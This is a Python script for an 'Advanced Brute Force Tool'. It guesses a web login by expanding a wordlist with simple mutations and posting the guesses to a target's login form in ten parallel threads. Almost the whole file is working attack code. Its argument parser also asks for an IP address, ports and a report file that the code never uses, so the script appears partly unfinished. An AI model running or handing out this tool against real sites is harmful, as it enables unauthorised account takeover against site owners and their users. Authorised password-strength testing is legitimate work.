import requests
import concurrent.futures
import logging
import itertools
import string
import time
import argparse

# Configure logging
logging.basicConfig(filename='bruteforce.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to generate password mutations
def generate_password_mutations(password):
    mutations = set()
    mutations.add(password)
    mutations.add(password.capitalize())
    mutations.add(password.upper())
    mutations.add(password.lower())
    for i in range(10):
        mutations.add(f"{password}{i}")
        mutations.add(f"{i}{password}")
    return mutations

# Function to load wordlist and generate mutations
def load_wordlist_with_mutations(wordlist):
    with open(wordlist, 'r') as file:
        passwords = set(line.strip() for line in file)
    all_passwords = set()
    for password in passwords:
        all_passwords.update(generate_password_mutations(password))
    return all_passwords

# Function to attempt a login
def attempt_login(url, username_field, password_field, username, password):
    try:
        data = {username_field: username, password_field: password}
        response = requests.post(url, data=data)
        if "Invalid login" not in response.text:  # Adjust this condition based on your application's response
            return (username, password)
        logging.info(f"Failed attempt: {username}:{password}")
    except requests.RequestException as e:
        logging.error(f"Request error: {e}")
    return None

# Function to perform brute force attack with threading
def brute_force_login(url, username_field, password_field, username, wordlist):
    passwords = load_wordlist_with_mutations(wordlist)
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_password = {executor.submit(attempt_login, url, username_field, password_field, username, pwd): pwd for pwd in passwords}
        for future in concurrent.futures.as_completed(future_to_password):
            result = future.result()
            if result:
                print(f"Success! Username: {result[0]}, Password: {result[1]}")
                return
    print("Brute force attack completed without success.")

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='Advanced Brute Force Tool')
    parser.add_argument('--url', required=True, help='The URL of the website to check')
    parser.add_argument('--ip', required=True, help='The IP address to scan for open ports')
    parser.add_argument('--ports', nargs='+', type=int, default=[22, 80, 443, 8080], help='List of ports to scan')
    parser.add_argument('--output', default='security_report.json', help='Output file for the security report')
    parser.add_argument('--username', required=True, help='The username to use for the brute force attack')
    parser.add_argument('--wordlist', required=True, help='Path to the wordlist file')
    return parser.parse_args()

# Main function
def main():
    args = parse_arguments()

    url = args.url
    username_field = "username"  # Replace with the actual form field name
    password_field = "password"  # Replace with the actual form field name
    username = args.username
    wordlist = args.wordlist

    start_time = time.time()
    brute_force_login(url, username_field, password_field, username, wordlist)
    end_time = time.time()

    print(f"Brute force attack took {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    main()